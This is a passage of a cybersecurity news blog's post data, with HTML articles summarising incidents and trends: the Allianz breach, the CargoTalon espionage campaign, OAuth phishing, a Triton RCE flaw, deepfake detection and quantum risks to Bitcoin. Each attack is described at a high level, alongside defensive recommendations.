      <p>While <strong>no financial or password data</strong> was breached, personal identifiable information (PII) — including names, emails, policy numbers, and partial SSNs — of nearly <strong>1.4 million U.S. customers</strong> were exposed. Internal employee records were also impacted in limited cases.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h3>🔑 Key Insights</h3><br>
      <ul>
        <li>🎯 <strong>Social Engineering Vector:</strong> Attackers didn't break in — they were <em>let in</em> through carefully crafted human manipulation.</li>
        <li>🧩 <strong>Third-Party Vulnerability:</strong> The CRM vendor was integrated into Allianz systems, providing an indirect access route.</li>
        <li>📈 <strong>Increasing Trend:</strong> Over 30% of modern data breaches now involve third-party service providers.</li>
        <li>🕵️ <strong>Delayed Detection:</strong> The breach went unnoticed for days until suspicious behavior triggered an internal investigation.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>💥 Business Impact</h3><br>
      <ul>
        <li>⚖️ <strong>Regulatory Scrutiny:</strong> Allianz is under review by the U.S. Federal Trade Commission (FTC) and several state-level data protection authorities.</li>
        <li>📉 <strong>Reputational Fallout:</strong> Initial reports caused a 2.3% drop in parent company Allianz SE’s stock within 24 hours.</li>
        <li>💬 <strong>Customer Distrust:</strong> Policyholders expressed concern over the safety of their data, leading to increased service cancellation requests.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h3>✅ What You Can Do</h3><br>
      <ul>
        <li>🔐 <strong>Zero Trust Vendor Access:</strong> Treat all third-party platforms as high-risk entry points; restrict privileges accordingly.</li>
        <li>📚 <strong>Train Your Teams:</strong> Conduct continuous simulation-based social engineering training (phishing, vishing, impersonation drills).</li>
        <li>🧩 <strong>Review API Connections:</strong> Audit CRM and SaaS tool integrations regularly for excessive or outdated permissions.</li>
        <li>🛑 <strong>Monitor Lateral Movement:</strong> Deploy user behavior analytics (UBA) to detect unusual data access across vendors.</li>
        <li>📑 <strong>Vendor SLAs:</strong> Establish breach notification, response time, and compliance clauses in all vendor contracts.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#f8d7da;padding:15px;border-radius:8px;">
      <h3>🚨 Why This Matters</h3><br>
      <p>This breach proves that even the most trusted institutions are vulnerable—not because of a lack of investment in cybersecurity, but because of <strong>unmonitored vendor pipelines and human error</strong>.</p>
      <p>As the insurance industry becomes increasingly digitized, its attack surface grows. <strong>Security strategies must now extend beyond the firewall</strong>, incorporating third-party ecosystems, workforce behavior, and supply chain transparency.</p>
    </section>

    <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
      <h3>📌 Final Thought</h3><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">"An attacker doesn’t need to breach your servers — they just need to fool someone who can."</blockquote>
      <p>Cybersecurity is no longer just a technical concern — it’s a <strong>trust issue</strong>. The Allianz breach offers a harsh lesson in vigilance: <em>you’re only as strong as your weakest link</em>.</p>
      <p>Make third-party security a boardroom-level priority today — because tomorrow’s breach might start with someone else’s mistake.</p>
    </section>
  </div>
`},{id:"cargo-talon-eaglet-cyber-espionage-russia-july-2025",title:"🎯 Operation CargoTalon – EAGLET Backdoor Targets Russian Aerospace Sector",date:"2025-07-29",author:"EthicalByte",summary:"A sophisticated cyber‑espionage campaign dubbed Operation CargoTalon used the EAGLET backdoor to infiltrate Russian aerospace organizations, marking a major escalation in state-linked hacking activity.",tags:["Cyber Espionage","EAGLET","Russian Aerospace","Operation CargoTalon","UNG0901","InfoSec"],imageKey:"cargoTalonBanner",content:`
  <div style="background:#fdfdfd;padding:24px;border-radius:12px;border:1px solid #e2e8f0;font-size:15px;line-height:1.6;color:#1e293b;">

    <div style="text-align:center;margin-bottom:20px">
      <h2 style="color:#1e293b;">🎯 Operation CargoTalon – EAGLET Backdoor Targets Russian Aerospace</h2><br>
      <p><i>Published: July 25, 2025 | Author: EthicalByte</i></p>
    </div>

    <section>
      <h3 style="color:#1e293b;">🔍 What Happened?</h3><br>
      <p>Cybersecurity researchers uncovered a stealthy operation—<strong>Operation CargoTalon</strong>—that delivered a sophisticated backdoor named <strong>EAGLET</strong> to compromise Russian aerospace and defense firms. The threat actor behind this is tracked as <strong>UNG0901</strong>.</p>
      <p>The group relied on phishing lures using transport and logistics themes, tricking users into downloading ZIP files containing Windows shortcut (.lnk) files. These launched PowerShell scripts that executed a fake document and installed EAGLET in the background.</p>
    </section>

    <section style="margin-top:20px;background:#fffbea;padding:16px;border-radius:10px;">
      <h3 style="color:#92400e;">🛠️ Attack Mechanics</h3><br>
      <ul>
        <li>📎 ZIP Archive includes transport-themed filenames like <em>“TTN‑Reference‑Sheet.zip”</em></li>
        <li>🔗 LNK file silently runs PowerShell, deploying a decoy Excel file</li>
        <li>🧬 Injects the <strong>EAGLET</strong> backdoor DLL with shell command and file access capability</li>
        <li>🌐 Connects to C2 IP: <code>185.225.17.104</code></li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#f8d7da;padding:15px;border-radius:8px;">
      <h3 style="color:#1e293b;">📊 Why It Matters</h3><br>
      <ul>
        <li>🚨 <strong>Target:</strong> High-value defense and aerospace networks</li>
        <li>🛡️ <strong>Strategic Espionage:</strong> Long-term persistence possible using DLL sideloading</li>
        <li>🎭 <strong>Disguise:</strong> Using business documents increases phishing success rate</li>
      </ul>
      <p>This campaign highlights how cyber‑espionage no longer requires zero-days when attackers exploit human behavior and predictable file structures.</p>
    </section>

    <section style="margin-top:20px;background:#ecfdf5;padding:16px;border-radius:10px;">
      <h3 style="color:#047857;">✅ How to Defend</h3><br>
      <ul>
        <li>📧 Run phishing simulations with document-based bait</li>
        <li>🔎 Alert on PowerShell running via Explorer shortcuts</li>
        <li>🔐 Monitor traffic to suspicious C2 infrastructure</li>
        <li>📚 Train all employees—not just IT—on threat vector recognition</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#e0f2fe;padding:16px;border-radius:10px;">
      <h3 style="color:#0369a1;">🌐 Broader Implications</h3><br>
      <p>Operations like CargoTalon are increasing in frequency, often linked to nation-state actors. Russian, Chinese, North Korean, and other aligned APTs are shifting from destructive malware to <strong>targeted exfiltration and silent persistence</strong>.</p>
      <p>UNG0901’s methods align with other reported campaigns in the Asia‑Europe corridor. The inclusion of multiple decoy documents also points to multi-sector targeting across transport, defense, and policy organizations.</p>
    </section>

    <section style="margin-top:20px;">
      <h3 style="color:#1e293b;">📌 Final Thought</h3><br>
      <blockquote style="border-left:4px solid #0369a1;padding-left:12px;">"CargoTalon shows us that even logistics paperwork can be weaponized—reminding us that digital warfare thrives on everyday trust."</blockquote>
      <p>The takeaway? A ZIP file with a familiar name might be the launchpad for state-level intrusion. The key to stopping it is layered defense, proactive awareness, and training that treats every file like a possible threat.</p>
    </section>

    
  </div>
`},{id:"vastav-ai-deepfake-detection-july-2025",title:"🎯 Vastav AI: India’s Real-Time Deepfake Defense System",date:"2025-07-30",author:"EthicalByte",summary:"Vastav AI, India’s first indigenous real-time deepfake detection system developed by Zero Defend Security, is transforming how we combat misinformation by offering 99% accuracy across images, audio, and video.",tags:["Deepfake Detection","AI in Cybersecurity","Zero Defend Security","Misinformation","India Cybersecurity"],imageKey:"vastavAIDeepfakeBanner",content:`
  <div style="background-color:#f9fafb;padding:24px;border-radius:12px;border:1px solid #e5e7eb;">

    <div style="text-align:center;">
      <h3 style="color:#111827;">🧠 Vastav AI: India’s Real-Time Deepfake Defense System</h3><br>
      <p style="font-style:italic;color:#6b7280;">Where truth meets technology — Vastav AI takes on the era of misinformation with real-time precision.</p>
    </div>

    <section style="margin-top:24px;">
      <h4 style="color:#b91c1c;">📢 What Happened?</h4><br>
      <p>In 2025, <strong>Zero Defend Security</strong> introduced <strong>Vastav AI</strong> — India’s first AI-powered deepfake detection system built for real-time authenticity analysis of images, videos, and audio. With fake media spiraling out of control, Vastav promises up to 99% accuracy using advanced neural networks.</p>
      <p>This innovation responds directly to the rise of manipulated media in politics, social engineering, cybercrime, and misinformation warfare.</p>
    </section>

    <section style="margin-top:24px;background:#fef3c7;padding:20px;border-radius:8px;">
      <h4 style="color:#92400e;">🧪 Technical Breakdown</h4><br>
      <ul>
        <li>🤖 <strong>AI Core:</strong> Built on large transformer-based neural networks for deep media pattern recognition.</li>
        <li>🧠 <strong>Cross-Modality Detection:</strong> Works across multiple formats — audio, video, and image frames.</li>
        <li>🚀 <strong>Low Latency:</strong> Offers real-time predictions ideal for broadcast, legal, and field use.</li>
        <li>🔌 <strong>Public APIs:</strong> Integrates easily with journalistic platforms, social media checkers, and law enforcement dashboards.</li>
      </ul>
    </section>

    <section style="margin-top:24px;">
      <h4 style="color:#1d4ed8;">📈 Real-World Applications</h4><br>
      <ul>
        <li>📰 <strong>News Verification:</strong> Major TV channels and media use Vastav to validate viral clips before airing.</li>
        <li>👮 <strong>Police Evidence Vetting:</strong> Used in cybercrime units to assess authenticity of video proof.</li>
        <li>🎓 <strong>Research & Academia:</strong> Supports detection of synthetic interviews or altered documentation in thesis defenses.</li>
        <li>🗳️ <strong>Election Monitoring:</strong> Helps EC & monitoring bodies during elections to counter propaganda videos.</li>
      </ul>
    </section>

    <section style="margin-top:24px;background:#e0f2fe;padding:20px;border-radius:8px;">
      <h4 style="color:#0c4a6e;">🚧 Challenges Ahead</h4><br>
      <ul>
        <li>📊 <strong>Dataset Bias:</strong> Indian languages and regional content require more diverse training data.</li>
        <li>📉 <strong>False Flags:</strong> Occasional over-corrections could flag authentic videos, risking trust.</li>
        <li>🧠 <strong>Arms Race:</strong> Deepfake models like Sora or StyleGAN evolve rapidly — Vastav must adapt faster.</li>
      </ul>
    </section>

    <section style="margin-top:24px;background:#ecfdf5;padding:20px;border-radius:8px;">
      <h4 style="color:#065f46;">🔍 Why This Matters</h4><br>
      <p>Vastav AI symbolizes India’s entrance into the elite club of real-time cybersecurity defense technology. With global conflicts, political disruption, and misinformation pandemics on the rise — tools like Vastav offer a digital shield for truth, reputation, and democracy.</p>
      <p>It isn’t just a tool — it’s a **strategic cybersecurity asset** born out of India’s growing AI capabilities.</p>
    </section>

    <section style="margin-top:24px;">
      <h4 style="color:#7c3aed;">💬 Industry Response</h4><br>
      <ul>
        <li>🔎 <strong>Cybersecurity Analysts:</strong> Calling it the “Indian version of Reality Defender.”</li>
        <li>📢 <strong>Journalists:</strong> Applaud its potential in fighting misinformation in rural and low-tech areas.</li>
        <li>🎯 <strong>Lawmakers:</strong> Encouraging regulation that includes Vastav-style checks on social media uploads.</li>
      </ul>
    </section>

    <section style="margin-top:24px;background:#f3f4f6;padding:20px;border-radius:8px;">
      <h4 style="color:#111827;">🌐 The Global Lens</h4><br>
      <p>While global firms like Microsoft and Reality Defender dominate AI deepfake detection, Vastav is among the first real-time native systems purpose-built for India’s sociopolitical context. Its independence from western platforms ensures privacy, regional understanding, and sovereign scalability.</p>
    </section>

    <section style="margin-top:24px;">
      <h4 style="color:#4b5563;">🌟 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #6366f1;padding-left:12px;">"In a world where truth is constantly distorted, Vastav AI is not just a defense mechanism — it’s a digital compass."</blockquote>
      <p>As India enters its AI decade, the launch of Vastav AI marks a new phase in securing digital truth. This 50th blog post celebrates not just a product but a national milestone — where cyber defense meets innovation, ethics, and urgency.</p>
    </section>

  </div>
`},{id:"quantum-bitcoin-resurrection-july-2025",title:"🧠 Quantum Threat: Could Lost Bitcoin Be Resurrected?",date:"2025-07-31",author:"EthicalByte",summary:"Quantum computers could soon unlock access to long-lost or dormant Bitcoin wallets by breaking the cryptography behind them. While it might sound like science fiction, the threat is real—and approaching faster than we think.",tags:["Quantum Computing","Bitcoin","ECDSA","Cryptography","Cybersecurity","Post-Quantum Security"],imageKey:"quantumBitcoinBanner",content:`
  <div style="background-color:#f9f9f9;padding:20px;border-radius:12px;border:1px solid #ddd;">

    <div style="text-align:center;"><br>
      <h3 style="color:#1a1a1a;">🧠 Quantum Threat: Could Lost Bitcoin Be Resurrected?</h3><br>
      <p style="font-style:italic;">If quantum computers evolve faster than crypto standards, trillions in digital value could be cracked open.</p>
    </div>

    <section style="margin-top:20px;">
      <h4 style="color:#6a1b9a;">🌐 What’s the Big Idea?</h4><br>
      <p>Quantum computing poses a unique risk to digital assets like Bitcoin. These machines don’t just compute faster—they operate on a different mathematical paradigm. The <strong>Elliptic Curve Digital Signature Algorithm (ECDSA)</strong>—which secures Bitcoin’s private keys—was never built with quantum resistance in mind.</p>
      <p>This means a powerful enough quantum computer could <strong>derive a private key from a public Bitcoin address</strong>, especially if the public key has already been revealed through a previous transaction.</p>
    </section>

    <section style="margin-top:20px;background:#f3e5f5;padding:15px;border-radius:8px;">
      <h4 style="color:#4a148c;">💻 Technical Breakdown</h4><br>
      <ul>
        <li>🔐 <strong>ECDSA Vulnerability:</strong> Based on the difficulty of solving discrete logarithm problems — something classical computers struggle with, but quantum computers could crack with Shor’s Algorithm.</li>
        <li>⚛️ <strong>Shor’s Algorithm:</strong> Designed to factor large primes and solve problems underpinning public key cryptography—effectively reducing ECDSA’s complexity from “infeasible” to “solvable.”</li>
        <li>🧠 <strong>Quantum Readiness:</strong> Bitcoin addresses are safe until their public key is exposed (usually during outgoing transactions). After that, they become vulnerable.</li>
        <li>🧱 <strong>Blockchain Permanence:</strong> Once public keys are on the blockchain, they’re available forever — meaning they could be targeted years or decades later.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#00796b;">📉 What’s at Risk?</h4><br>
      <ul>
        <li>🪙 <strong>Lost Wallets:</strong> Over <strong>4 million Bitcoins</strong> (worth billions) are believed to be lost. Quantum breakthroughs could resurrect these—possibly into the wrong hands.</li>
        <li>👤 <strong>Early Users:</strong> Early adopters who used simple or reused keys are more at risk, especially if they’ve exposed public keys in past transactions.</li>
        <li>🏦 <strong>Exchanges & Custodians:</strong> Platforms holding crypto on behalf of clients must move fast to adopt post-quantum standards—or face systemic risk.</li>
        <li>📉 <strong>Market Panic:</strong> Even the rumor of a working quantum attack could shake global confidence and cause massive sell-offs.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#d7ffd9;padding:15px;border-radius:8px;">
      <h4 style="color:#1b5e20;">🛡️ What Can We Do Today?</h4><br>
      <ul>
        <li>✅ <strong>Upgrade Wallets:</strong> Start using quantum-resistant or multi-signature wallets where possible.</li>
        <li>✅ <strong>Post-Quantum Research:</strong> Follow progress from <a href="https://csrc.nist.gov/projects/post-quantum-cryptography" target="_blank">NIST’s PQC initiative</a> which is finalizing algorithms immune to quantum attacks.</li>
        <li>✅ <strong>Network Vigilance:</strong> Developers and miners should begin discussions on quantum-safe forks and transitions for vulnerable coins.</li>
        <li>✅ <strong>Minimize Public Exposure:</strong> Refrain from reusing addresses and only reveal public keys when necessary.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#fffde7;padding:15px;border-radius:8px;">
      <h4 style="color:#f9a825;">📚 Did You Know?</h4><br>
      <ul>
        <li>📡 Google’s 2019 quantum supremacy experiment solved a problem in 200 seconds that would take supercomputers 10,000 years.</li>
        <li>🧩 Ethereum has similar cryptographic weaknesses — and Vitalik Buterin has publicly spoken about quantum concerns.</li>
        <li>🌍 Governments and intelligence agencies are already <strong>harvesting encrypted data</strong> today to decrypt later with quantum tools—a strategy known as “store now, decrypt later.”</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#e3f2fd;padding:15px;border-radius:8px;">
      <h4 style="color:#1565c0;">🔭 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #1565c0;padding-left:10px;">"Quantum computing could be both the grave robber and the guardian of crypto."</blockquote>
      <p>Quantum threats to Bitcoin aren’t here yet — but they’re coming. Whether it’s by choice or by breach, the ecosystem must evolve. From the Bitcoin core dev team to casual holders, <strong>post-quantum migration plans must begin now</strong>.</p>
      <p>In a digital age where <strong>mathematics = trust</strong>, we must prepare for the moment when math itself gets upgraded.</p>
    </section>

  </div>
`},{id:"nigeria-ai-cybersecurity-gap-july-2025",title:"🤖 AI-Powered Tools Can Bridge Nigeria’s Cybersecurity Gaps – Sophos",date:"2025-08-01",author:"EthicalByte",summary:"Sophos executive Prish Thaakar emphasizes how Nigerian organizations can leverage AI and machine learning to detect threats faster, reduce data breaches, and build resilience against evolving cyberattacks.",tags:["Nigeria","AI Security","Sophos","Cybersecurity Strategy","Prish Thaakar"],imageKey:"nigeriaAICybersecurityBanner",content:`
  <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

    <div style="text-align:center;"><br>
      <h3 style="color:#1a1a1a;">🤖 AI-Powered Tools Can Bridge Nigeria’s Cybersecurity Gaps – Sophos</h3><br>
      <p style="font-style:italic;">Artificial Intelligence could become Nigeria’s frontline defense against digital threats.</p>
    </div>

    <section style="margin-top:20px;">
      <h4 style="color:#e63946;">📢 What Happened?</h4><br>
      <p>According to <strong>Prish Thaakar</strong>, a senior executive at Sophos, Nigeria’s current cybersecurity posture can be significantly strengthened through AI-powered solutions.</p>
      <p>In an interview with Vanguard, he outlined how machine learning and automation could help Nigerian firms detect and respond to sophisticated threats in real time — reducing response time, cost, and human error.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h4 style="color:#856404;">🧠 Why AI Is a Game-Changer</h4><br>
      <ul>
        <li>🚨 <strong>Threat Prediction:</strong> AI models can anticipate attack patterns before they strike.</li>
        <li>⚙️ <strong>Automated Response:</strong> Machine learning can flag anomalies and trigger rapid responses without human delay.</li>
        <li>🔍 <strong>Data-Driven Insights:</strong> Organizations gain deeper understanding of attack surfaces and weak points.</li>
        <li>🔐 <strong>Scalability:</strong> Even small businesses can deploy AI tools to protect digital assets affordably.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#457b9d;">🌍 Nigeria’s Cybersecurity Landscape</h4><br>
      <p>Nigeria, like many developing nations, has faced rising incidents of ransomware, phishing, and insider attacks. A large digital population, coupled with under-resourced IT teams, has made the country vulnerable.</p>
      <p>By adopting AI tools from vendors like Sophos, Nigerian institutions could close detection gaps, protect customer data, and comply with national digital safety policies.</p>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h4 style="color:#155724;">✅ What Needs to Happen</h4><br>
      <ul>
        <li>💡 <strong>Upskilling:</strong> Encourage cybersecurity training to maximize AI tool usage.</li>
        <li>🔗 <strong>Public-Private Collaboration:</strong> Gov & private sectors must jointly invest in AI readiness.</li>
        <li>📊 <strong>Adoption of Threat Intelligence:</strong> Shareable, AI-enhanced threat feeds can increase collective resilience.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#1a73e8;">🌟 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In a connected world, cybersecurity is no longer optional — and AI is no longer futuristic.”</blockquote>
      <p>Prish Thaakar’s insights serve as a wake-up call for Nigeria’s cybersecurity industry. Strategic AI deployment could transform vulnerability into strength, and create a secure digital future for West Africa’s tech hub.</p>
    </section>

  </div>
`},{id:"microsoft-oauth-tycoon-phishing-august-2025",title:"🎯 Fake OAuth Apps + Tycoon Kit: 3,000+ Microsoft 365 Accounts Breached",date:"2025-08-02",author:"EthicalByte",summary:"A stealthy phishing campaign using fake Microsoft OAuth apps and the Tycoon kit has compromised thousands of Microsoft 365 accounts. It bypasses MFA and mimics over 50 known brands. This operation is a masterclass in modern-day identity hijacking.",tags:["OAuth","Phishing","Microsoft 365","Tycoon Kit","Cybersecurity","Adversary-in-the-middle"],imageKey:"microsoftOauthTycoonAttack",content:`
  <div style="background-color:#fbfbfb;padding:20px;border-radius:12px;border:1px solid #e0e0e0;">

    <div style="text-align:center;">
      <h3 style="color:#1a1a1a;">🎯 Fake OAuth Apps + Tycoon Kit: 3,000+ Microsoft 365 Accounts Breached</h3><br>
      <p style="font-style:italic;color:#666;">A phishing campaign so advanced, it didn’t need passwords.</p>
    </div>

    <p>
      A highly coordinated phishing operation has exploited fake Microsoft OAuth apps combined with the Tycoon phishing kit, breaching over <strong>3,000 users across 900 organizations</strong>. 
      The attackers bypassed Multi-Factor Authentication (MFA) using adversary-in-the-middle (AiTM) infrastructure and tricked victims into authorizing malicious applications — all while maintaining long-term access to cloud data.
    </p>

    <p>
      Victims clicked on phishing emails that led them to spoofed Microsoft login pages. These pages were actually AiTM proxies that intercepted credentials and authentication tokens. 
      From there, users were prompted to grant OAuth permissions to fake apps cleverly disguised as Microsoft Teams, Adobe, SharePoint, or DocuSign integrations.
    </p>

    <p>
      Once the permissions were granted, the attackers didn’t need usernames or passwords anymore. They could access emails, calendars, OneDrive files, and Teams messages — all through OAuth token access. 
      The Tycoon phishing kit automated much of the infrastructure, handling session hijacking, brand spoofing, and token persistence in a seamless flow.
    </p>

    <p>
      Microsoft confirmed that these fake apps were hosted in legitimate cloud environments and even passed basic domain verification. Because they abused the OAuth consent model, victims didn’t realize anything had gone wrong.
    </p>

    <div style="background:#fff3cd;padding:15px;border-radius:8px;margin-top:20px;border:1px solid #ffecb5;">
      <p><strong>Highlights:</strong><br>
      • 3,000+ users affected across 900+ companies<br>
      • 50+ spoofed app brands used to lure victims<br>
      • MFA bypassed with adversary-in-the-middle proxies<br>
      • Access granted via consent to fake OAuth apps<br>
      • Attackers used token refresh mechanisms to maintain persistence<br>
      </p>
    </div>

    <p style="margin-top:20px;">
      This is a critical lesson for defenders: Cloud security is not just about strong passwords or even MFA anymore. It’s about understanding how OAuth scopes and token lifetimes work, auditing what applications users are authorizing, and restricting third-party app access by default.
    </p>

    <p>
      Organizations are advised to review tenant-wide OAuth policies, restrict user consent, and regularly scan for anomalous cloud app activity. User education around fake app consent requests is now as vital as phishing awareness itself.
    </p>

    <p style="margin-top:20px;">
      This campaign is one of the most sophisticated examples of phishing-as-a-service we’ve seen in 2025 — stealthy, brand-polished, and identity-focused. It proves one thing: attackers no longer just want your credentials. They want your trust.
    </p>

  </div>
`},{id:"network-security-digital-era-august-2025",title:"🛡️ Network Security in the Digital Era: Safeguarding the Digital World",date:"2025-08-04",author:"EthicalByte",summary:"In an interconnected world, effective network security demands a multi-layered approach—from firewalls and IDS to training and incident planning. This blog explores what it takes to stay secure in 2025 and beyond.",tags:["Network Security","Cybersecurity Strategies","Digital Infrastructure","Encryption","Firewall","IDS"],imageKey:"networkSecurityDigitalEraBanner",content:`
  <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
    
    <div style="text-align:center;"><br>
      <h3 style="color:#1a1a1a;">🛡️ Network Security in the Digital Era: Safeguarding the Digital World</h3><br>
      <p style="font-style:italic;">A secure network is no longer optional—it's the foundation of digital resilience.</p>
    </div>

    <section style="margin-top:20px;">
      <h4 style="color:#e63946;">🌐 The Modern Threat Landscape</h4><br>
      <p>From ransomware attacks to nation-state espionage, today’s digital environment demands a proactive and robust network defense strategy. The increasing complexity of infrastructure and cloud integration introduces more attack vectors than ever before.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h4 style="color:#856404;">🔐 Building Stronger Defenses</h4><br>
      <ul>
        <li>🧱 <strong>Firewalls:</strong> Your first line of defense against unauthorized access.</li>
        <li>🕵️‍♂️ <strong>Intrusion Detection Systems (IDS):</strong> Real-time detection of suspicious activity.</li>
        <li>🔒 <strong>Encryption:</strong> End-to-end data protection during transmission and at rest.</li>
        <li>🛠️ <strong>Regular Software Updates:</strong> Patch known vulnerabilities before attackers do.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#457b9d;">👨‍🏫 Human Element in Cybersecurity</h4><br>
      <p>Technology alone isn’t enough. Employees are often the weakest link in the security chain. Consistent training on phishing awareness, password hygiene, and secure practices is critical to building a cyber-aware workforce.</p>
    </section>

    <section style="margin-top:20px;background:#f0f0f0;padding:15px;border-radius:8px;">
      <h4 style="color:#2a2a2a;">📦 Incident Response & Resilience</h4><br>
      <p>When prevention fails, response speed matters. An effective incident response plan minimizes damage, ensures regulatory compliance, and restores operations efficiently. Testing and updating the plan regularly is non-negotiable.</p>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h4 style="color:#155724;">🚀 Future-Proofing Security</h4><br>
      <ul>
        <li>🧠 Integrate AI/ML for anomaly detection.</li>
        <li>⚙️ Automate routine threat analysis.</li>
        <li>📡 Secure IoT devices and remote endpoints.</li>
        <li>📊 Conduct regular audits and penetration testing.</li>
      </ul>
      <p>As cyberattacks grow in sophistication, adapting and upgrading your defenses is critical for long-term resilience.</p>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#1a73e8;">💡 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“Cybersecurity is a journey, not a destination. Stay aware. Stay updated. Stay secure.”</blockquote>
      <p>Whether you're protecting a small business or managing national infrastructure, effective network security is the backbone of trust in a digital world. The threats are real—but so are the solutions.</p>
    </section>

  </div>
`},{id:"nvidia-triton-ai-rce-2025",title:"NVIDIA Triton AI Servers Can Be Hijacked — No Login Needed",date:"2025-08-05",author:"EthicalByte",summary:"New critical vulnerabilities in NVIDIA's Triton Inference Server expose AI infrastructure to unauthenticated remote code execution. Researchers warn it could lead to full model theft and unauthorized control.",tags:["NVIDIA","Triton","AI Security","Remote Code Execution","Model Theft","Unauthenticated Access"],imageKey:"nvidiaTritonExploit",content:`
    <div style="background-color:#f6f8fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
      <h3 style="color:#c53030;">🚨 <br> Critical RCE Vulnerability in NVIDIA Triton AI Servers</h3><br>
      <h3>🧠 What Happened?</h3><br>
      <ul>
        <li>🚀 Researchers discovered a <strong>chain of vulnerabilities</strong> in <strong>NVIDIA’s Triton Inference Server</strong>.</li>
        <li>💥 Exploitation leads to <strong>unauthenticated remote code execution (RCE)</strong>.</li>
        <li>🎯 Attackers can fully hijack servers, steal AI models, manipulate predictions, or implant malware.</li>
        <li>🛠 The exploit starts with a <strong>single malformed HTTP request</strong> that bypasses authentication checks.</li>
      </ul>

      <h3>🔍 Why It Matters</h3><br>
      <p>NVIDIA Triton is widely used in AI production environments — including cloud AI workloads, model inference APIs, and internal ML Ops pipelines. A breach here could compromise:</p>
      <ul>
        <li>📊 Proprietary AI models & training data</li>
        <li>🔓 Intellectual property and competitive strategies</li>
        <li>🧠 Real-time inference results (autonomous driving, finance, etc.)</li>
      </ul>

      <h3>📌 Technical Overview</h3><br>
      <ul>
        <li>🧱 Vulnerabilities are related to insecure default settings and improper input sanitization in the model control APIs.</li>
        <li>🌐 No login or API key needed in certain misconfigured environments — opens up direct access to attackers.</li>
        <li>⚠ Unpatched Triton servers are a serious security risk in shared compute clusters and cloud workloads.</li>
      </ul>

      <h3>🛡 Recommendations</h3><br>
      <ul>
        <li>📥 Immediately update to the latest patched Triton release.</li>
        <li>🔐 Enforce strict authentication and tokenized API access.</li>
        <li>📉 Disable unused endpoints and monitor for anomalous inference requests.</li>
        <li>🛑 Limit external exposure of Triton instances and apply network segmentation.</li>
      </ul>

      <h3>📢 Final Thoughts</h3><br>
      <p>This is another stark reminder that <strong>AI infrastructure is a prime cyber target</strong>. As ML models become central to business and innovation, securing inference endpoints is no longer optional — it’s mission-critical.</p>

      <blockquote style="border-left:4px solid #c53030;padding-left:1em;margin-top:1em;">
        One malformed packet — and your AI is under enemy control.
      </blockquote>
    </div>
  `},{id:"generative-ai-cybersecurity-role",title:"The Role of Generative AI in Cybersecurity",date:"2025-08-06",author:"EthicalByte",summary:"Generative AI isn’t just for content—it’s changing cybersecurity too. From simulating attacks to anomaly detection, learn how AI is transforming defenses.",tags:["Generative AI","Cybersecurity","AI Security","Threat Detection","Cyber Defense"],imageKey:"generativeAICyberBanner",content:`
    <div style="background:linear-gradient(135deg,#e0e7ff,#f0fdf4);padding:1.5em;border-radius:12px;color:#111;">
      <h3>🧠 The Role of Generative AI in Cybersecurity</h3><br>
      
      <p>Generative AI has moved far beyond art tools and chat assistants—it's now playing a critical role in shaping how we <strong>defend against cyber threats</strong>. As digital threats grow more sophisticated, defenders are turning to AI to keep pace.</p>
      
      <h3>🔍 What Can Generative AI Do?</h3><br>
      <ul>
        <li>🛠 <strong>Simulate Cyberattacks:</strong> Generative AI can mimic real-world cyberattacks to test your systems, making red teaming and penetration testing faster and more realistic.</li>
        <li>📈 <strong>Detect Anomalies:</strong> By analyzing system logs and traffic patterns, it can highlight suspicious behavior that traditional systems might miss.</li>
        <li>🔄 <strong>Automated Threat Modeling:</strong> AI systems can generate evolving attack scenarios that adapt to real-time defenses.</li>
        <li>🔐 <strong>Enhance Zero Trust Architecture:</strong> AI helps verify access continuously by understanding user behavior profiles.</li>
      </ul>

      <h3>🚨 Why It Matters</h3><br>
      <p>Attackers are already experimenting with AI for phishing, deepfakes, and malware. We need to meet fire with fire. Generative AI gives defenders a way to:</p>
      <ul>
        <li>🛡 Proactively identify vulnerabilities</li>
        <li>⚡ Respond faster to threats</li>
        <li>📊 Visualize complex threat data intuitively</li>
      </ul>

      <h3>🎯 Get 1% Better at Cybersecurity Today</h3><br>
      <p>Learning never stops in this field. If you're serious about stepping up your game in cybersecurity</p>
     

      <h3>📌 Final Thoughts</h3><br>
      <p>Generative AI is a double-edged sword. But in the right hands, it can become a powerful tool for protecting networks, systems, and data. The future of cybersecurity will be human + AI—working side by side to outsmart evolving threats.</p>

      <blockquote style="border-left:4px solid #2563eb;padding-left:1em;margin-top:1em;">
        ⚡ Stay ahead. Learn fast. Defend smart.
      </blockquote>
    </div>
